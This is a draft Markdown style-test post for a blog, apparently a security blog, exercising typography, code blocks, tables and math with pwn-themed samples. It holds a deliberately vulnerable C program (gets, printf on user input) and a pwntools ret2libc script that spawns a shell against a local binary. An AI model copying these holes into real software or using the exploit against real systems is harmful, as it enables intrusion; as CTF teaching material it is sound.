---
title: 'Style test: every element the site knows how to draw'
description: 'A kitchen-sink post for checking typography, code, tables, images, math and footnotes. It is a draft, so it only shows up under npm run dev.'
pubDate: 2026-10-05
updatedDate: 2026-10-07
tags: ['meta', 'test', 'pwn']
draft: true
math: true
cover: ./cover.jpg
coverAlt: 'Fog over a pine forest on a hillside'
---

This is a paragraph of ordinary running text, long enough to wrap across a few lines so the measure and the leading can be judged properly. It has **bold text**, *italic text*, ***both at once***, ~~struck-through text~~, a [link to the index](/), a [link that leaves the site](https://disable-javascript.org), and some `inline_code()` sitting in the middle of a sentence.

A second paragraph, short.

## A second-level heading

Text directly under an `h2`, to check the spacing between the rule and the first line.

### A third-level heading

Text under an `h3`.

#### A fourth-level heading

Text under an `h4`.

## Lists

An unordered list:

- First item
- Second item, which is deliberately long enough to wrap onto a second line so the hanging indent can be checked against the marker
- Third item, with a nested list:
  - Nested one
  - Nested two
- Fourth item

An ordered list:

1. Leak a libc address
2. Compute the base
3. Build the ROP chain
   1. `pop rdi; ret`
   2. Address of `"/bin/sh"`
   3. `system`
4. Send it

A task list:

- [x] Draw the logo
- [ ] Write a real post

## Quotes

> Hackers solve problems and build things, and they believe in freedom and voluntary mutual help.
>
> A second paragraph inside the same quote.

## Code

A C block:

```c
#include <stdio.h>

int main(void) {
    char buf[64];
    puts("say something:");
    gets(buf);              /* never do this */
    printf(buf);            /* or this */
    return 0;
}
```

A Python block with a line far longer than the column, to check horizontal scrolling inside the block rather than across the page:

```python
from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")
io = process(elf.path)

payload = flat({72: [rop.find_gadget(["pop rdi", "ret"])[0], next(libc.search(b"/bin/sh\x00")), libc.sym.system]})
io.sendlineafter(b"say something:", payload)
io.interactive()
```

A shell session:

```sh
$ checksec ./vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

A block with no language:

```
0x00401136  55                push rbp
0x00401137  4889e5            mov rbp, rsp
0x0040113a  4883ec40          sub rsp, 0x40
```

## Table

| Protection | Status  | Bypass                   |
| ---------- | ------- | ------------------------ |
| NX         | enabled | ROP                      |
| Canary     | none    | n/a                      |
| PIE        | off     | fixed addresses          |
| ASLR       | on      | leak a libc pointer first |

## Images

An image in the body, with a caption below it:

<figure>

![Dark, rough ocean waves seen from above](./ocean.jpg)

<figcaption>Figure 1. The body image, as opposed to the cover above.</figcaption>
</figure>

## Math

Inline math sits in the sentence: the offset is $o = |buf| + 8 = 72$ bytes.

Display math gets its own line:

$$
\text{base} = \text{leak} - \text{libc.sym}[\texttt{puts}]
$$

## Footnotes

A sentence with a footnote.[^1] And another one.[^long]

[^1]: The footnote text.
[^long]: A longer footnote, to see how the list at the bottom wraps.

---

That rule above is an `hr`. The end.
